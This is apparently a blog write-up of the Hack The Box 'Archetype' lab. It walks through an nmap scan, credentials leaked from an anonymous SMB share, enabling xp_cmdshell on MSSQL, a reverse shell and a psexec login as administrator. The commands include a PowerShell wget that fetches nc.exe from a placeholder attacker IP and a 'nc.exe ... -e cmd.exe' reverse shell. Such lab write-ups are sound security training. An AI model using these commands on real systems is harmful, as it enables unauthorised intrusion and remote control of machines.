---
published: true
---

This one was a classic, the room revolves around a misconfiguration in mssql that allows the user to enable_xp_cmdshell which opens a path to achieve remote code execution on the machine via xp_cmdshell.  



## Information Gathering
---
### Starting with a port scan:
First we do a fast scan in order to identify what ports are up and running:   
**nmap 10.10.10.27 -p- -Pn --min-rate 1500 -vvv -oN AllPorts.txt**
![nmap.png]({{site.baseurl}}/images/nmap.png)


And after that we run a full scan on the ports that we have identified:    
 **sudo nmap 10.10.10.27 -p 135,139,445,1433,5985,47001 -sVC -O -v -oA FoundPorts.txt**

which gives us the following output:
![nmap2.png]({{site.baseurl}}/images/nmap2.png)


We can check the running services and see that the running OS is Windows. Even more, it seems to be running a Microsoft Windows Server between version 2008 R2 and 2012 which are known to have quite a handful of exploits. Only in 2021 there have been [186 exploits](https://stack.watch/product/microsoft/windows-server-2008/#:~:text=In%202021%20there%20have%20been,had%20382%20security%20vulnerabilities%20published.&text=However%2C%20the%20average%20CVE%20base,2021%20is%20greater%20by%200.42.) with an average CVE of 7.9 out of 10.

We also see **WinRM** (Windows Remote Management) that is a Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate.
[EvilWinRm](https://github.com/Hackplayers/evil-winrm) can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation hacking/pentesting phase. The purpose of this program is to provide nice and easy-to-use features for hacking. It can be used with legitimate purposes by system administrators as well but the most of its features are focused on hacking/pentesting stuff. 



## The SMB share
---
Having port 445 up hints me to try to connect to HTB Archetype using smb.

**smbclient -L 10.10.10.27**  
![smbp.png]({{site.baseurl}}/images/smbp.png)


Looks like we have found quite a few shares, even without using a password.
The most interesting share is "**backups**" which is also the only non-default share.  
Using **smbclient \\\\10.10.10.27\\backups** we can connect to this share.

We now have access to a config file **prod.dtsConfig** that  can be downloaded with: 
**get prod.dtsConfig**.
![smb2.png]({{site.baseurl}}/images/smb2.png)


The file was actually a lucky hit as it contains information about the backend database and also an username and password pair which can be used to gain a foothold on the box.

![file.png]({{site.baseurl}}/images/file.png)



## Obtaining a foothold
---
I am going to use the **impacket mssql client** from [SecureAuthCorp](https://github.com/SecureAuthCorp/impacket) in order to connect to the database.

### Installing steps
1. cd /opt  && sudo git clone https://github.com/SecureAuthCorp/impacket.git
2. cd impacket/
3. sudo pip3 install .
4. sudo python3 setup.py install

The command line goes as it follows:  
 **python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth**

_Note:  "-windows-auth" flag is very important since w/o it the shell won't be able to connect to the database._

This lands us in a what appears to be a SQL shell, running a few SQL commands seem to prove my hypothesis, now as with any other tool that you are not quite sure how it's supposed to be run, typing HELP is always a good option ;).

![sql.png]({{site.baseurl}}/images/sql.png)

As it looks like we have enough privileges to enable xp_cmdshell, so we go on and type **enable_xp_cmdshell;** and after that **reconfigure;**.



Now in order to see if we can run commands i'm going to try the following syntax: **xp_cmdshell powershell whoami /priv**, and this sure enough returns the Privileges information of the current user.
![shrll1.png]({{site.baseurl}}/images/shrll1.png)  

_Note: Pay attention to [SeImpersonatePrivilege](https://steflan-security.com/linux-privilege-escalation-token-impersonation/) as this will be important later, also it helps reading about [exploitable windows tokens](https://steflan-security.com/linux-privilege-escalation-token-impersonation/) if you're interested in privilege escalation techniques_

Now as we got a foothold we can either try to get a more stable shell, or proceed with this one. But for now this is enough to grab the user flag.
![FlagUser.png]({{site.baseurl}}/images/flag1.png)
 



## Escalating to a reverse shell
---
Escalating to a reverse shell in this scenario is pretty much trivial and can be done in a handful of ways.
The way i'm going to do it is by uploading an [old windows netcat executable](https://github.com/Ev3nS/Useful-Pentesting-Executables) that has the **-e flag** in order to spawn a powershell.exe and send it to my local listener.

### Uploading  nc.exe
1. Spawning a http server on desktop (where the executable is located):  
![httpServer.png]({{site.baseurl}}/images/httpServer.png)
2. Getting the executable on the machine with the command line:  
**xp_cmdshell powershell "wget http://YourIP:GivenPort/nc.exe -OutFile %temp%/nc.exe"**  
![SqlCommand.png]({{site.baseurl}}/Images/SqlCommand.png)


### Getting the shell
1. Spawning a local listener on port 4444 with the command line: **nc -lvnp 4444**
2. Running the uploaded executable as it follows: **xp_cmdshell  powershell "nc.exe YourIP YourPort -e cmd.exe"**  
![SqlCommand2.png]({{site.baseurl}}/Images/SqlCommand2.png)
3. Check if we got a hit on our local listener:  
![FirstCmdShell.png]({{site.baseurl}}/Images/FirstCmdShell.png)




## Escalating to a root shell
---
As of now, we have full access to a low privileged account, so a good thing to do is to enumerate what you can do with that account on the system. Also we know from the SMB chapter that this user can Impersonate Tokens, which means that we can take ownage of a process run by a higher privileged user on the system and create a privileged shell. This can be done via [Juicy-Potato exploit](https://github.com/ohpe/juicy-potato). But for the sake of this room i will go with an easier path, as this vulnerability will be exploited in a later post.

Once you gain access to a shell in general it is good to check a few things: what privileges you have, what processes are running, what is your ip, who else is on the box, what files you have access to, any weird files/binaries/executables that shouldn't be there, are there any notes or secret files that are left unprotected? what's the bash/batch history and so on.

Fortunately while digging for the last accessed files i've found this peculiar file lying around:  		 

![oddfile.png]({{site.baseurl}}/images/oddfile.png)

As it looks like this file was actually pretty useful as it leaks the credentials of the administrator account:  
![creds.png]({{site.baseurl}}/images/creds.png)


Now as we have the credentials we can use a [python tool for PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) in order to remotely connect to the box as administrator:
![root.png]({{site.baseurl}}/Images/root.png)

All that is left to do now is to grab the root flag and we're done.    
![rootflang.png]({{site.baseurl}}/images/root2.png)

## Conclusions
---
On an ending note, i really liked this box for the fact that it promotes a good pentesting methodology, it's backbone is just a lot of enumeration and googling  and it offers a nice corelation between different services.   





